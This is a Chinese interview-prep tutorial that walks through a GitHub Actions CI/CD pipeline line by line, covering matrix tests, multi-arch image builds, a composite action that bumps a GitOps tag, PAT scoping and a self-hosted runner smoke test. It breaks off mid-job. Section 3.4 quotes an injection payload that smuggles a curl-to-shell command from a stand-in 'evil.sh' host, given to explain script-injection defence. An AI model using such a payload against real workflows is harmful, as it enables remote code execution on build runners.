# GitHub Actions 大实验 · 从零手写流水线（Mac 版 · 面试导向）

> `lab-ops.md` 告诉你**按什么顺序操作**；这份告诉你**每行 YAML 为什么这么写、action 怎么挑**，
> 目标是让你合上文档也能在白板上把这条流水线写出来。
> 环境是 macOS + Multipass（`mac-multipass/README.md` 是底座说明）。

---

# Part 0 · 先想清楚：这个项目在面试里怎么用

## 0.1 三十秒自述（背下来）

> 我做了一条贴近生产的 GitOps 风格 CI/CD 流水线。应用是个 Node/Express 的外卖订单服务 `dasher-svc`。
> push 到 main 之后，GitHub Actions 先在 node 18/20 两个版本上跑单测做门禁，通过后用 buildx
> 构建 **amd64 + arm64 双架构镜像**推到 GHCR，tag 是 `<run_number>-<git短sha>` 保证可追溯。
> 然后走一个**我自己写的 composite action**，把新 tag 写进一个**独立的 GitOps 配置仓库**的
> kustomize overlay 里 commit + push。**整条 CI 流水线没有任何一处 kubectl** —— 真正把镜像变成
> 集群里跑着的 Pod，是 ArgoCD 监听那个配置仓库拉式同步做的。最后用一台**自建 runner**（跑在我本机
> 的 k3d 集群旁边）做部署后的**只读冒烟验证**，curl 线上 `/api/version` 断言版本号等于本次构建的 tag。
> prod 那一段挂在 GitHub Environment 上，可以配人工审批门。

这段话里每一个名词面试官都可能追问，Part 3 逐个拆。

## 0.2 面试官会追的问题 → 对应本文哪节

| 追问 | 看哪节 |
|---|---|
| 你怎么决定用哪个 action？怎么保证它安全？ | Part 2 全部 |
| `GITHUB_TOKEN` 和 PAT 有什么区别？什么时候必须用 PAT？ | 3.5 / Part 5 |
| workflow 的 `permissions` 怎么配才算最小权限？ | 3.1 / Part 5 |
| matrix 是干什么的？`include`/`exclude` 呢？ | 3.2 |
| 你为什么要自己写 action，不直接写 `run:`？ | 3.4 |
| composite / JS / Docker action 三种怎么选？ | 2.1 / 3.4 |
| 自建 runner 什么场景才需要？有什么风险？ | Part 4 |
| GitHub Environments 解决什么问题？ | 3.7 |
| 为什么 CI 不直接 `kubectl apply`？ | 0.3 |
| 你这条流水线踩过什么坑？ | **Part 6（最重要）** |

## 0.3 这条流水线最大的设计决策：CI 不碰集群

**CD 的边界只到「把新镜像 tag 改进 GitOps 配置仓库并 push」。全程零 `kubectl apply`。**

为什么这是对的（面试可以展开讲）：

1. **权限收敛**。CI runner 是一台会跑「任意分支上的 workflow 代码」的机器。给它 kubectl 凭证，
   等于给了任何能提 PR 的人改生产集群的能力。
2. **审计**。部署入口唯一化成 Git，谁在什么时候把哪个版本推上去，`git log` 一查就有，
   不依赖流水线日志（日志会过期、会被覆盖）。
3. **可回滚**。回滚 = `git revert`，不是「重跑某次流水线」。
4. **声明式对账**。ArgoCD 持续比对「Git 里声明的状态」和「集群实际状态」，
   有人手动改了集群会被自愈拉回来（drift detection）。命令式 `kubectl set image` 做不到这一点。

那自建 runner 派什么用场？GitHub 云端 runner 连不进你的内网集群，
但**验证部署有没有真的生效**需要连到集群。所以自建 runner 只做**只读冒烟**（就一条 `curl`），
不做部署。**这个区分本身就是最大的考点。**

---

# Part 1 · 环境：一次性起好（Mac / Apple Silicon）

```bash
# 1) 一次性安装
brew install --cask multipass

# 2) 起虚机（macOS 跑不了 WSL2，用 Ubuntu 虚机；三门课共用这一台）
KK=~/cc-ai-projects/kodekloud-notes-and-labs
multipass launch 22.04 --name gitops-labs --cpus 4 --memory 8G --disk 40G
multipass mount "$KK" gitops-labs:/home/ubuntu/kk-src

# 3) 底座：docker + k3d(集群名 gitops，映射 NodePort 30081/30082) + kubectl + argocd + ArgoCD 本体
multipass exec gitops-labs -- bash /home/ubuntu/kk-src/labs/argocd/wsl2-k3d/setup.sh

# 4) runner 二进制 + 两个 namespace
multipass exec gitops-labs -- bash /home/ubuntu/kk-src/labs/github-actions/runner/wsl2-k3d/setup.sh

VM_IP=$(multipass info gitops-labs | awk '/IPv4/{print $2}'); echo "VM_IP=$VM_IP"
```

**验收**（每一步都要看到，看不到就别往下走）：

```bash
multipass exec gitops-labs -- kubectl get nodes          # k3d-gitops-server-0  Ready
multipass exec gitops-labs -- kubectl get ns | grep dash # dasher-dev / dasher-prod  Active
multipass exec gitops-labs -- 'sudo docker port k3d-gitops-serverlb'  # 要看到 30081/30082
```

> **端口映射只能建集群时定，事后改不了。** 如果 `docker port` 里没有 30081/30082，
> 后面 runner 的冒烟 curl 一定不通，必须 `k3d cluster delete gitops` 重建。这是个高频坑。

**收工/重来**：
```bash
multipass stop gitops-labs      # 暂停，不删数据
multipass delete gitops-labs --purge   # 彻底删
```

---

# Part 2 · 怎么找对 action（很多人缺的一环）

## 2.1 先搞清楚 action 有三种

`uses:` 引用的东西本质上是**一个仓库里的 `action.yml`**。按 `runs.using` 分三类：

| 类型 | `runs.using` | 特点 | 什么时候用 |
|---|---|---|---|
| **JavaScript** | `node20` / `node24` | 直接在 runner 上跑 node，**启动最快**，跨平台 | 官方 action 基本都是这种 |
| **Docker** | `docker` | 起个容器跑，环境完全可控 | 需要特定工具链/非 JS 生态；**只能在 Linux runner 上跑** |
| **Composite** | `composite` | 把若干 `run:` 和 `uses:` 打包复用，**没有独立运行时** | 你只是想把几步 shell 封装起来复用 —— 本实验就是这种 |

**面试点**：为什么本实验的 `bump-gitops-tag` 选 composite？
因为它做的事就是「checkout 另一个仓库 → 装 yq → 改一行 YAML → commit push」，
全是现成的 action + shell，没有任何需要独立运行时的逻辑。写成 JS action 要维护 `node_modules`
和打包（`@vercel/ncc`），写成 Docker action 每次要拉镜像、慢。**composite 是最轻的正确答案。**

## 2.2 `uses:` 的四种写法

```yaml
uses: actions/checkout@v7                         # ① 公开仓库的 action（最常见）
uses: ./.github/actions/bump-gitops-tag           # ② 本仓库里的 action（本实验用）
uses: docker://alpine:3.20                        # ③ 直接用一个 Docker 镜像
uses: octo-org/private-repo/.github/actions/x@main # ④ 别的仓库的子目录
```

② 的关键：**路径是相对于仓库根目录的**，而且用之前**必须先 `actions/checkout`**，
否则文件根本不在 runner 上。这是新手最容易漏的一步。

## 2.3 去哪找

1. **GitHub Marketplace**：https://github.com/marketplace?type=actions —— 按关键词搜。
2. **直接搜仓库**：很多好用的 action 没上架 Marketplace。`docker/build-push-action` 这种
   官方组织仓库直接去 `github.com/docker` 看。
3. **反查**：找一个你信任的开源项目，翻它的 `.github/workflows/` 看人家用什么。**这招最实用。**

## 2.4 判断一个 action 能不能用：六条检查清单

拿到候选之后，**按顺序**过一遍：

| # | 查什么 | 怎么查 | 红线 |
|---|---|---|---|
| 1 | **谁维护的** | 仓库 owner 是不是 `actions/`、`docker/`、`aws-actions/` 这种官方组织；Marketplace 上有没有 ✅ Verified creator 徽章 | 个人号 + 无星标 = 除非没得选，否则不用 |
| 2 | **还活着吗** | Releases 页最近一次发版日期；Issues 有没有人回 | 一年没发版 + issue 堆积 = 危险 |
| 3 | **运行时版本** | `action.yml` 里的 `runs.using` | `node16`/`node20` 已废弃，会在你的运行页刷 warning，且随时可能被强制迁移 |
| 4 | **它要什么权限** | README + `action.yml` 的 `inputs`，看有没有要 token | 要 PAT 的一定要看清它拿去干什么 |
| 5 | **接口是什么** | 读 `action.yml` 的 `inputs` / `outputs`（**比 README 准**，README 经常过期） | — |
| 6 | **能不能不用它** | 这件事三行 `run:` 能不能搞定？ | 能就别引入依赖 |

**第 6 条经常被忽略但最重要**：每引入一个第三方 action，就是往你的构建流程里塞一段
**会在你的 runner 上以你的 `GITHUB_TOKEN` 权限执行的陌生代码**。这是真实存在的供应链攻击面
（2025 年 `tj-actions/changed-files` 被投毒就是这个路子）。

## 2.5 怎么读 `action.yml`（最关键的技能）

不要读 README，**读源码**。以本实验自己写的那个为例：

```bash
# 查看任何一个 action 的真实接口
curl -s https://raw.githubusercontent.com/docker/build-push-action/v7.3.0/action.yml | head -60
```

你要看三样东西：

```yaml
inputs:                      # ← 我能传什么进去，哪些 required
  context:
    description: 'Build context'
    required: false
    default: '.'
outputs:                     # ← 我能拿什么出来（用 steps.<id>.outputs.<name> 取）
  imageid:
    description: 'Image ID'
runs:
  using: 'node24'            # ← 运行时；也决定了它能不能在你的 runner 架构上跑
  main: 'dist/index.js'
```

**`required: true` 的 input 你没传 → 报错 `Input required and not supplied: <name>`。**
（Part 6 的坑 1 就是这个报错，一个字都不差。）

## 2.6 版本怎么钉：三档

```yaml
uses: actions/checkout@v7                                      # 大版本浮动
uses: actions/checkout@v7.0.1                                  # 小版本固定
uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # commit SHA（不可变）
```

| 写法 | 安全性 | 维护成本 | 用在哪 |
|---|---|---|---|
| `@v7` | 低（tag 可以被重新指向） | 最低，自动吃补丁 | 内部项目、学习项目 |
| `@v7.0.1` | 中 | 要手动升 | 一般生产 |
| `@<40位SHA>` | **高，唯一不可变的引用** | 高，靠 Dependabot 帮你升 | 金融/合规、公开仓库 |

**面试答法**：「tag 是可变引用，攻击者拿到仓库权限可以把 `v4` 重新指到恶意 commit 上，
你什么都不改下一次构建就中招了。SHA 是内容寻址的，不可变。所以对安全敏感的项目我们钉 SHA，
再用 Dependabot 自动提升级 PR 来解决维护成本。GitHub 现在还有个仓库级开关
`sha_pinning_required` 可以强制这件事。」

本实验用到的 action 的 SHA（写这份文档时的最新版，供参考）：

```yaml
actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1        # v7.0.1
actions/setup-node@820762786026740c76f36085b0efc47a31fe5020      # v7.0.0
actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
docker/login-action@dbcb813823bdd20940b903addbd779551569679f     # v4.6.0
docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a # v7.3.0
docker/setup-buildx-action@37fe631027851001ddb9b187196cc803df7f5f0e # v4.3.0
docker/setup-qemu-action@96fe6ef7f33517b61c61be40b68a1882f3264fb8 # v4.2.0
```

自己查 SHA 的命令（**这个要会**）：

```bash
gh api repos/actions/checkout/git/ref/tags/v7.0.1 --jq '.object.sha'
# 如果返回的 .object.type 是 "tag"（annotated tag），要再解一层：
gh api repos/actions/checkout/git/tags/<上一步的sha> --jq '.object.sha'
```

## 2.7 怎么发现自己用的 action 过期了

**运行页的 Annotations 区**会直接告诉你。本实验真实遇到过：

```
! Node.js 20 is deprecated. The following actions target Node.js 20 but are being
  forced to run on Node.js 24: actions/checkout@v4, actions/setup-node@v4, ...
```

看到就去升。查最新版：

```bash
gh api repos/actions/checkout/releases/latest --jq .tag_name
```

批量查（写进你的日常工具箱）：

```bash
for a in actions/checkout actions/setup-node actions/upload-artifact \
         docker/login-action docker/build-push-action; do
  printf "%-32s %s\n" "$a" "$(gh api repos/$a/releases/latest --jq .tag_name)"
done
```

## 2.8 本实验的选型理由（面试可以逐条讲）

| 需求 | 选的 action | 为什么不自己写 `run:` |
|---|---|---|
| 拉代码 | `actions/checkout` | 它处理了浅克隆深度、submodule、LFS、token 注入、多仓库 checkout —— 自己写 `git clone` 会漏一堆边界 |
| 装 Node + 依赖缓存 | `actions/setup-node` | `cache: npm` 一行搞定 lockfile 哈希做 key 的缓存，自己用 `actions/cache` 拼要写十几行 |
| 传测试日志 | `actions/upload-artifact` | 制品有保留期、下载 UI、跨 job 传递，自己实现不了 |
| 登录 GHCR | `docker/login-action` | 它会正确处理凭证不落盘、结束时登出；`docker login` 明文写 config.json 有泄露风险 |
| 构建推镜像 | `docker/build-push-action` | 多架构 manifest list、缓存后端、构建摘要，`docker build` 做不到 |
| 跨架构模拟 | `docker/setup-qemu-action` | 注册 binfmt_misc handler，纯 shell 要 `docker run --privileged tonistiigi/binfmt` |
| 建 buildx 构建器 | `docker/setup-buildx-action` | 默认 docker driver 不支持多平台，必须换 docker-container driver |
| **改 GitOps 仓库的 tag** | **自己写 composite** | 这是**业务逻辑**，没有通用 action 能干；而且要复用两次（dev/prod） |

**最后一行是重点**：能力边界清楚的人，知道什么该用现成的、什么必须自己写。

---

# Part 3 · 一行一行写 `ci-cd.yml`

> **怎么用这一部分**：先把 `.github/workflows/ci-cd.yml` 删空，跟着 3.1 → 3.9 一节一节往里加，
> 每加完一节就 push 一次、去 Actions 页看结果。**不要一次性抄完整份**——你要的是肌肉记忆。

## 3.0 目录结构与硬性约束

```
dasher-svc/                        ← 必须是一个独立的 GitHub 仓库
├── .github/
│   ├── workflows/
│   │   ├── ci-cd.yml              ← 主流水线
│   │   ├── notify-slack.yml       ← 可复用 workflow
│   │   └── security.yml           ← CodeQL
│   └── actions/
│       └── bump-gitops-tag/
│           └── action.yml         ← 自己写的 composite action
├── app/                           ← Node 应用
└── ...
```

**硬性约束（面试常考）**：workflow 文件**必须**在仓库**真实根目录**的 `.github/workflows/` 下。
GitHub Actions **没有** Jenkins 那种「在 UI 里指定 Script Path 去子目录找 Jenkinsfile」的能力。
所以这个 lab 目录必须**单独推成一个仓库**，不能留在 monorepo 里指望 GitHub 去子目录找。

## 3.1 骨架：`name` / `on` / `concurrency` / `permissions` / `env`

**要解决的问题**：什么时候触发？默认给多大权限？全局常量放哪？

```yaml
name: dasher-svc CI/CD

on:
  push:
    branches: [main]
  workflow_dispatch:              # 允许在 Actions 页面手动点按钮跑
    inputs:
      skip_prod:
        description: 'true = 只走到 dev 冒烟为止，不推进 prod'
        required: false
        default: 'false'
        type: string

concurrency:
  group: dasher-svc-cicd-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read                  # ← 全局默认：只读

env:
  APP_DIR: app
  IMAGE: ghcr.io/${{ github.repository_owner }}/dasher-svc
```

**逐 key 讲：**

- **`on:`** —— 常见触发器还有 `pull_request`、`schedule`（cron）、`release`、`workflow_call`（被别的 workflow 调）。
  `push.branches` 是**分支过滤**，还可以配 `paths:` 做**路径过滤**（只有 `app/**` 变了才跑，省 CI）。
- **`workflow_dispatch.inputs`** —— 手动触发时弹表单。`type` 支持 `string` / `boolean` / `choice` / `environment`。
  取值用 `${{ github.event.inputs.skip_prod }}`。注意：**只有 dispatch 触发时才有值**，push 触发时是空字符串
  ——所以 3.7 里的判断要写成 `!= 'true'` 而不是 `== 'false'`。
- **`concurrency`** —— 同一个 `group` 同时只跑一个 run，新的来了把旧的取消。
  `group` 里带 `${{ github.ref }}` 表示「按分支隔离」，不同分支互不取消。
  ⚠️ 生产要小心：如果流水线已经推进到 prod 审批阶段，直接 cancel 可能留下半吊子状态。
- **`permissions`** —— 最重要的一个 key，见下面专门说明。
- **`env`** —— workflow 级环境变量，所有 job 可见。也可以写在 job 级或 step 级，**就近覆盖**。

### `permissions` 必须搞清楚的三件事

1. **它控制的是内置 `GITHUB_TOKEN` 的权限**，跟你的 PAT 无关。
2. **一旦你写了 `permissions:` 块，没列出来的 scope 全部变成 `none`**（不是「保持默认」）。
   这是个高频陷阱——本实验就因为这个不能开 `cache-to: type=gha`（那个要 `actions: write`）。
3. **仓库设置里的「Default workflow permissions」只决定「你没写 `permissions:` 时的默认值」**。
   即使仓库默认是 read-only，job 里显式写 `packages: write` **依然生效**。

所以正确姿势是：**全局给 `contents: read`，哪个 job 要写权限就在那个 job 单独加。**

```bash
# 查你仓库当前的默认值
gh api repos/<OWNER>/<REPO>/actions/permissions/workflow
# => {"default_workflow_permissions":"read","can_approve_pull_request_reviews":false}
```

**✅ 验收**：这一节 push 上去不会跑任何 job（还没写 `jobs:`），但 Actions 页左侧应该出现 workflow 名字，
说明 YAML 语法过了。

## 3.2 `test` job：matrix + 依赖缓存 + artifact

**要解决的问题**：在多个 Node 版本上跑单测做门禁，测试挂就不许部署。

```yaml
jobs:
  test:
    name: Unit Test (node ${{ matrix.node }})
    runs-on: ubuntu-latest
    timeout-minutes: 10
    strategy:
      fail-fast: false            # 一条腿挂了，另一条继续跑完（好排查）
      matrix:
        node: [18, 20]
    steps:
      - name: Checkout
        uses: actions/checkout@v7

      - name: Setup Node ${{ matrix.node }}
        uses: actions/setup-node@v7
        with:
          node-version: ${{ matrix.node }}
          cache: npm
          cache-dependency-path: ${{ env.APP_DIR }}/package-lock.json

      - name: npm install
        working-directory: ${{ env.APP_DIR }}
        run: npm ci

      - name: npm test
        working-directory: ${{ env.APP_DIR }}
        run: npm test | tee ../test.log

      - name: 上传测试日志 artifact
        if: matrix.node == 20      # 只在其中一条腿上传，避免同名冲突
        uses: actions/upload-artifact@v7
        with:
          name: dasher-svc-test-log
          path: test.log
          retention-days: 7
```

**逐 key 讲：**

- **`strategy.matrix`** —— `node: [18, 20]` **展开成 2 个并行 job**。多维矩阵是笛卡尔积：
  `{node: [18,20], os: [ubuntu-latest, macos-latest]}` = 4 个 job。
- **`fail-fast`** —— 默认 `true`，一条腿失败立刻取消其他腿。调成 `false` 能看到「是所有版本都挂了
  还是只有 node 18 挂」，**排查价值远大于省的那点 CI 时间**。
- **`matrix.include` / `matrix.exclude`**（面试会问）：
  ```yaml
  matrix:
    node: [18, 20]
    include:
      - node: 20
        coverage: true            # 给 node 20 那条腿多加一个变量
      - node: 22                  # 直接追加一条全新的腿
    exclude:
      - node: 18                  # 从笛卡尔积里剔掉某个组合
  ```
- **`cache: npm`** —— `setup-node` 内置缓存，key 是 `package-lock.json` 的哈希，
  **lockfile 不变就命中**。lockfile 不在仓库根目录时 `cache-dependency-path` **必填**。
- **`npm ci` 而不是 `npm install`** —— `ci` 严格按 lockfile 装、装前先删 `node_modules`，
  **可重现**。CI 里永远用 `ci`。小细节，但很显专业度。
- **`timeout-minutes`** —— 不写默认 360 分钟（6 小时）。一个卡死的 job 能烧掉一整天额度，**每个 job 都该写**。
- **`if: matrix.node == 20`** —— step 级条件，`if:` 里不用写外层 `${{ }}`。
- **`| tee ../test.log`** —— 日志既进控制台又落文件，好上传。

**✅ 验收**：Actions 页看到 `Unit Test (node 18)` 和 `Unit Test (node 20)` **两个并行 job**；
node 20 那条腿的 Summary 底部有 `dasher-svc-test-log` artifact 可下载。
第二次跑时 setup-node 那步日志里应出现 `Cache restored from key: ...`。

## 3.3 `build-push` job：GHCR + 可追溯 tag + 多架构

**要解决的问题**：把代码打成镜像推到 registry，tag 必须能反查到是哪次构建、哪个 commit。

```yaml
  build-push:
    name: Build & Push Image (GHCR)
    needs: test                   # ← 测试不过就不构建
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write             # ← 推 GHCR 需要的最小权限
    outputs:
      tag: ${{ steps.meta.outputs.tag }}     # ← 把 tag 暴露给下游 job
    steps:
      - uses: actions/checkout@v7

      - name: 算本次制品 tag
        id: meta                  # ← 有 id 才能被 steps.meta.outputs 引用
        run: |
          short_sha=$(echo "${GITHUB_SHA}" | cut -c1-7)
          echo "tag=${{ github.run_number }}-${short_sha}" >> "$GITHUB_OUTPUT"
          echo "short_sha=${short_sha}" >> "$GITHUB_OUTPUT"

      - name: 装 QEMU（跨架构模拟）
        uses: docker/setup-qemu-action@v4

      - name: 装 Buildx（多架构构建器）
        uses: docker/setup-buildx-action@v4

      - name: 登录 GHCR
        uses: docker/login-action@v4
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}    # ← 内置 token 就够，不用 PAT

      - name: docker build + push
        uses: docker/build-push-action@v7
        with:
          context: ${{ env.APP_DIR }}
          push: true
          platforms: linux/amd64,linux/arm64
          build-args: |
            BUILD_TAG=${{ steps.meta.outputs.tag }}
            GIT_SHA=${{ steps.meta.outputs.short_sha }}
          tags: ${{ env.IMAGE }}:${{ steps.meta.outputs.tag }}
```

**逐 key 讲：**

- **`needs: test`** —— job 依赖。`test` 是 matrix，**两条腿都绿了**才往下走。
- **`outputs:`** —— job 级输出，下游用 `${{ needs.build-push.outputs.tag }}` 取。
  **三层链路缺一不可**：job 的 `outputs.tag` ← `steps.<id>.outputs.tag` ← 那个 step 往
  `$GITHUB_OUTPUT` 写的 `tag=xxx`。新手最容易在这里断链（忘了给 step 加 `id:`）。
- **`$GITHUB_OUTPUT`** —— 现在的正确写法。老教程里的 `::set-output name=x::y` **已废弃**，
  面试时说出这个区别是加分项。
- **tag 策略 `<run_number>-<短sha>`** —— `run_number` 单调递增看出先后，短 sha 反查 commit。
  **比 `latest` 好在哪**：`latest` 不可追溯、不可回滚、还让 K8s 的 `imagePullPolicy` 行为变诡异。
  一句话：**制品 tag 必须不可变且可追溯**。
- **`secrets.GITHUB_TOKEN`** —— 每次 run 自动生成、run 结束即失效的临时 token，
  作用域**硬锁在当前仓库**。推 GHCR 够用（package 属同一 owner）。
- **`platforms:`** —— 出 **manifest list**（一个 tag 底下挂多个架构），拉的时候自动挑本机架构那份。
  **没有这行，Apple Silicon 上必炸**（Part 6 坑 3）。代价：arm64 那份靠 QEMU 模拟构建，慢。
- **`build-args`** —— 传进 Dockerfile 的 `ARG`，本实验用来把版本号烧进镜像，
  让 `/api/version` 能回显——这是后面冒烟验证能成立的前提。

**✅ 验收**：仓库主页右侧 **Packages** 出现 `dasher-svc`。验证多架构：

```bash
TOK=$(curl -s "https://ghcr.io/token?scope=repository:<OWNER>/dasher-svc:pull&service=ghcr.io" \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
curl -s -H "Authorization: Bearer $TOK" \
     -H "Accept: application/vnd.oci.image.index.v1+json" \
     https://ghcr.io/v2/<OWNER>/dasher-svc/manifests/<你的tag> \
     | python3 -m json.tool | grep architecture
# 期望 amd64 和 arm64 各一行
```

## 3.4 写你自己的 composite action

**要解决的问题**：「改 GitOps 仓库的 tag」这件事 dev 和 prod 各要做一次。复制两份是错的。

放在 `.github/actions/bump-gitops-tag/action.yml`：

```yaml
name: 'Bump GitOps Image Tag'
description: '把新镜像 tag 写进 GitOps 配置仓库对应 overlay 的 kustomization.yaml 并 commit+push'

inputs:
  overlay:       { description: 'overlays/<overlay>，dev 或 prod', required: true }
  image-name:    { description: 'kustomization images[].name 要匹配的完整镜像名', required: true }
  image:         { description: '镜像地址（不含 tag），写进 newName', required: true }
  tag:           { description: '本次构建的 tag，写进 newTag', required: true }
  gitops-repo:   { description: 'owner/repo', required: true }
  gitops-pat:    { description: '有 push 权限的 PAT', required: true }

runs:
  using: 'composite'
  steps:
    - name: checkout GitOps 配置仓库
      uses: actions/checkout@v7
      with:
        repository: ${{ inputs.gitops-repo }}   # ← 检出【另一个】仓库
        token: ${{ inputs.gitops-pat }}         # ← 所以必须给 PAT
        path: gitops-repo                       # ← 放进子目录，别覆盖主仓库

    - name: 装 yq
      shell: bash                               # ← composite 里每个 run 都【必须】写 shell
      run: |
        if ! command -v yq >/dev/null 2>&1; then
          ARCH=$(dpkg --print-architecture)     # ← 别写死 amd64
          sudo curl -fsSL -o /usr/local/bin/yq \
            "https://github.com/mikefarah/yq/releases/latest/download/yq_linux_${ARCH}"
          sudo chmod +x /usr/local/bin/yq
        fi
        yq --version

    - name: 改 kustomization.yaml
      shell: bash
      env:
        FILE: gitops-repo/overlays/${{ inputs.overlay }}/kustomization.yaml
        IMAGE_NAME: ${{ inputs.image-name }}
        IMAGE_REF:  ${{ inputs.image }}
        IMAGE_TAG:  ${{ inputs.tag }}
      run: |
        set -euo pipefail
        [ -f "$FILE" ] || { echo "❌ 没找到 $FILE"; exit 1; }
        yq -i '
          (.images[] | select(.name == strenv(IMAGE_NAME))).newName = strenv(IMAGE_REF) |
          (.images[] | select(.name == strenv(IMAGE_NAME))).newTag  = strenv(IMAGE_TAG)
        ' "$FILE"
        cat "$FILE"

    - name: commit + push
      shell: bash
      working-directory: gitops-repo
      env:
        OVERLAY: ${{ inputs.overlay }}
        IMAGE_NAME: ${{ inputs.image-name }}
        IMAGE_TAG: ${{ inputs.tag }}
      run: |
        set -euo pipefail
        git config user.name  "github-actions[bot]"
        git config user.email "github-actions[bot]@users.noreply.github.com"
        git add "overlays/${OVERLAY}/kustomization.yaml"
        if git diff --cached --quiet; then
          echo "tag 没变化，跳过 commit（幂等，避免空 commit 噪音）"
        else
          git commit -m "chore(${OVERLAY}): bump ${IMAGE_NAME} image tag to ${IMAGE_TAG}"
          git push
        fi
```

**composite action 的五个必知细节：**

1. **每个 `run:` 步骤必须显式写 `shell:`**。普通 workflow 里可省，composite 里省了直接报错。
2. **文件名必须是 `action.yml` 或 `action.yaml`**，目录名就是引用路径。
3. **用之前必须先 `actions/checkout`**，否则 runner 上根本没有这个文件。
4. **secrets 不会自动传进来**，必须通过 `inputs` 显式传（所以这里有个 `gitops-pat` input）。
5. **`branding:`（icon/color）只有上架 Marketplace 才用得上**，本地 action 可以省。

**安全细节（面试高分点）**：注意 yq 那步是把值放进 `env:` 再用 `strenv(IMAGE_NAME)` 引用，
**而不是**把 `${{ inputs.tag }}` 直接拼进 yq 表达式字符串。原因是**脚本注入**：
`${{ }}` 是在 shell 执行**之前**做纯文本替换的，如果那个值来自外部可控输入（PR 标题、分支名、issue 正文），
攻击者可以构造出 `"; curl evil.sh | sh; #` 这种东西直接拿到你 runner 上的命令执行。
**规则：任何 `${{ }}` 的值都先落进 `env:`，再在脚本里用 `$VAR` 引用。**

## 3.5 `bump-gitops-dev` job：跨仓库写 + 为什么 `GITHUB_TOKEN` 不够

```yaml
  bump-gitops-dev:
    name: Bump GitOps Tag (dev)
    needs: build-push
    runs-on: ubuntu-latest
    environment: dev              # ← 引用 environment，但 dev 不配保护规则 = 直通
    steps:
      - name: Checkout（拿到本仓库里的 composite action 定义）
        uses: actions/checkout@v7

      - name: 调用自定义 composite action
        uses: ./.github/actions/bump-gitops-tag
        with:
          overlay: dev
          image-name: ${{ env.IMAGE }}
          image: ${{ env.IMAGE }}
          tag: ${{ needs.build-push.outputs.tag }}
          gitops-repo: ${{ secrets.GITOPS_REPO }}
          gitops-pat: ${{ secrets.GITOPS_PAT }}
```

### `GITHUB_TOKEN` vs PAT —— 必考题

| | `secrets.GITHUB_TOKEN` | Personal Access Token |
|---|---|---|
| 谁给的 | GitHub 每次 run 自动生成 | 你自己在 Settings 里建 |
| 生命周期 | run 结束立刻失效 | 你设的过期时间 |
| 作用域 | **硬锁在当前仓库** | 你授予的范围 |
| 能跨仓库写吗 | **不能** | 能 |
| 权限怎么控 | workflow 的 `permissions:` | 建 token 时勾 |

**所以**：推 GHCR（同 owner 的 package）→ `GITHUB_TOKEN` 够；
push 到**另一个仓库** `dasher-gitops` → **必须 PAT**。

**PAT 要建成 fine-grained（细粒度）而不是 classic：**

- Repository access → **Only select repositories** → 只勾 `dasher-gitops`
- Permissions → Repository permissions → **Contents: Read and write** —— **就这一个**

**怎么证明你的 PAT 真的是最小权限**（这个自证动作面试里讲出来很加分）：

```bash
PAT='github_pat_xxx'
# ① 对目标仓库有 push
curl -s -H "Authorization: Bearer $PAT" https://api.github.com/repos/<OWNER>/dasher-gitops \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["permissions"])'
# => {'admin': True, 'push': True, ...}

# ② 对其他仓库应该【看都看不见】
curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $PAT" \
  https://api.github.com/repos/<OWNER>/dasher-svc
# => 404  （不是 403 —— fine-grained PAT 对没授权的仓库直接当不存在，这个区别本身就是考点）
```

写进仓库 secret：
```bash
gh secret set GITOPS_PAT -R <OWNER>/dasher-svc      # 交互式粘贴
gh secret list -R <OWNER>/dasher-svc                # 确认 GITOPS_REPO / GITOPS_PAT 两个都在
```

**✅ 验收**：`dasher-gitops` 仓库出现一个 `github-actions[bot]` 的 commit：
`chore(dev): bump ghcr.io/<OWNER>/dasher-svc image tag to <tag>`。

## 3.6 `verify-dev` job：自建 runner 上的只读冒烟

```yaml
  verify-dev:
    name: Verify Dev (Self-Hosted Runner, 只读)
    needs: [bump-gitops-dev, build-push]
    runs-on: [self-hosted, wsl2-k3d]     # ← 数组 = 标签【全部】匹配才派发
    timeout-minutes: 5
    steps:
      - name: 给 ArgoCD 一点时间同步
        run: sleep 15

      - name: curl dasher-dev，断言线上 tag == 本次构建 tag
        env:
          EXPECT_TAG: ${{ needs.build-push.outputs.tag }}
        run: |
          set -euo pipefail
          actual=$(curl -fsS http://localhost:30081/api/version \
                   | grep -o '"version":"[^"]*"' | cut -d'"' -f4)
          echo "线上版本 = ${actual} ；期望 = ${EXPECT_TAG}"
          [ "$actual" = "$EXPECT_TAG" ] || { echo "❌ 版本不符"; exit 1; }
          echo "✅ dev 已是本次构建版本"
```

**逐 key 讲：**

- **`runs-on: [self-hosted, wsl2-k3d]`** —— 数组语义是 **AND**：runner 必须**同时**带这两个标签。
  `self-hosted` 是所有自建 runner 自动带的内置标签。
- **这个 job 里没有 `actions/checkout`** —— 它不需要代码，只需要 curl。
  **自建 runner 上少一次 checkout 就少一次把代码落到你本机的机会**，这也是安全考量。
- **`curl -fsS`** —— `-f` 让 HTTP 4xx/5xx 返回非 0 退出码（不加的话拿到 500 也算成功）；
  `-sS` 静默但保留错误信息。**CI 里的 curl 永远加 `-fsS`。**
- **`set -euo pipefail`** —— `-e` 出错即停、`-u` 用未定义变量报错、`-o pipefail` 管道任一环失败即失败。
  不写 `pipefail` 的话 `curl ... | grep ...` 里 curl 挂了你还是拿到 0。
- **`sleep 15` 是简化**。生产该轮询 ArgoCD Application 的 sync/health 状态。
  面试被问到要**主动说**这是 lab 的简化、真实做法是什么——主动暴露简化处比被追问出来强得多。

**✅ 验收**：运行页里这个 job 展开 "Set up job"，能看到
`Runner name: 'mac-arm64-runner'`（而不是托管 runner 的 `Runner name: 'GitHub Actions N'`）。

## 3.7 `promote-prod`：Environment 审批门 + `if` 表达式

```yaml
  promote-prod:
    name: Bump GitOps Tag (prod, 需人工审批)
    needs: [verify-dev, build-push]
    if: ${{ github.event.inputs.skip_prod != 'true' }}
    runs-on: ubuntu-latest
    environment: prod             # ← 审批门挂在这里
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/bump-gitops-tag
        with:
          overlay: prod
          image-name: ${{ env.IMAGE }}
